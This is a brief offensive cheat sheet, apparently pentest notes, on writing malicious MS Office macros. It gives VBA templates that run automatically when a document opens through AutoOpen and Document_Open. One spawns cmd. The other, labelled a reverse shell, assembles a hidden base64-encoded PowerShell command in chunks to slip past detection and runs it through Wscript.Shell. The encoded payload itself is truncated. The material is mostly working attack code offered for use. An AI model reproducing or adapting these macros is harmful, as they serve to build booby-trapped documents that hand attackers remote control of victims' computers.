# How to create Macros for MS Office

## CMD

```python

Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "cmd"
  
End Sub
```

## Reverse shell

```python
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    #use splitter.py 
    #str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
    #n = 50
    #for i in range(0, len(str), n):
	#print "Str = Str + " + '"' + str[i:i+n] + '"'

    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    #etc.

    CreateObject("Wscript.Shell").Run Str
End Sub

```